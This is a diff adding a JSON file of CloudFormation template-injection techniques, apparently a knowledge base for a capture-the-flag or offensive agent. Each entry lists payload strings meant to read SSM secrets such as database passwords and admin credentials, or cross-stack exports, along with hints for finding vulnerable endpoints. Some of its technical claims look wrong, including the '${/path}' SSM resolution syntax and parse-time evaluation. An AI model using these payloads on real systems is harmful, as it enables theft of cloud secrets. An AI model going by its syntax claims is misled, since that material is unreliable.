@@ -1,0 +1,51 @@
+[
+  {
+    "id": "cf-injection-001",
+    "title": "AWS CloudFormation Fn::Sub SSM Parameter Injection",
+    "category": "cloud_injection",
+    "technique": "CloudFormation Template Injection via Fn::Sub",
+    "description": "When a CloudFormation parser accepts user-supplied templates without sanitization, use Fn::Sub intrinsic function to resolve SSM Parameter Store paths. The syntax ${/path/to/param} is resolved by CloudFormation's intrinsic function evaluator before the template is deployed. Common SSM paths include /secure/flag, /admin/credentials, /prod/database/password. Also try Fn::ImportValue to leak cross-stack exports.",
+    "payloads": [
+      "${/secure/flag}",
+      "${/flag}",
+      "${/admin/credentials}",
+      "${/prod/database/password}",
+      "${ssm:/secure/flag}",
+      "${resolve:ssm:/secure/flag}",
+      "${resolve:ssm-secure:/secure/flag}"
+    ],
+    "detection": "Look for endpoints accepting YAML/JSON templates with CloudFormation structure (AWSTemplateFormatVersion, Resources, Parameters sections). The parser may be a simplified CloudFormation processor that resolves Fn::Sub references.",
+    "references": ["https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/intrinsic-function-reference-sub.html"]
+  },
+  {
+    "id": "cf-injection-002",
+    "title": "CloudFormation Fn::ImportValue Cross-Stack Data Leak",
+    "category": "cloud_injection",
+    "technique": "Cross-Stack Export Access via Fn::ImportValue",
+    "description": "When CloudFormation stacks export values, other stacks can read them via Fn::ImportValue. If the template parser accepts arbitrary Fn::ImportValue references, use it to read cross-stack exports that may contain sensitive data or flags.",
+    "payloads": [
+      "{\"Fn::ImportValue\": \"flag\"}",
+      "{\"Fn::ImportValue\": \"secure-flag\"}",
+      "{\"Fn::ImportValue\": \"admin-credentials\"}"
+    ],
+    "detection": "After finding a /create or /validate-template endpoint, submit a template with Fn::ImportValue to test if exports are resolved.",
+    "references": ["https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/intrinsic-function-reference-importvalue.html"]
+  },
+  {
+    "id": "cf-injection-003",
+    "title": "CloudFormation Template Injection - General Approach",
+    "category": "cloud_injection",
+    "technique": "CloudFormation Template Injection",
+    "description": "CloudFormation template injection occurs when user input is passed to a CloudFormation parser without sanitization. Attack vectors include: (1) Fn::Sub to resolve SSM parameters, (2) Fn::ImportValue to leak cross-stack exports, (3) Fn::GetAtt to read resource attributes, (4) Ref to reference parameters that may contain sensitive defaults. The template engine evaluates these intrinsic functions at parse time, not deploy time, making them exploitable even if the stack creation fails.",
+    "payloads": [
+      "${/secure/flag}",
+      "${ssm:/flag}",
+      "{\"Fn::Sub\": \"${/secure/flag}\"}",
+      "{\"Fn::Sub\": \"${ssm:/flag}\"}",
+      "{\"Fn::ImportValue\": \"flag\"}",
+      "{\"Ref\": \"flag\"}"
+    ],
+    "detection": "Look for endpoints that accept YAML or JSON with CloudFormation template structure. Key indicators: parameters named 'template', 'stack', 'cf'; endpoints like /create, /validate, /deploy, /stack; documentation mentioning CloudFormation or template parsing.",
+    "references": ["https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/template-reference.html"]
+  }
+]
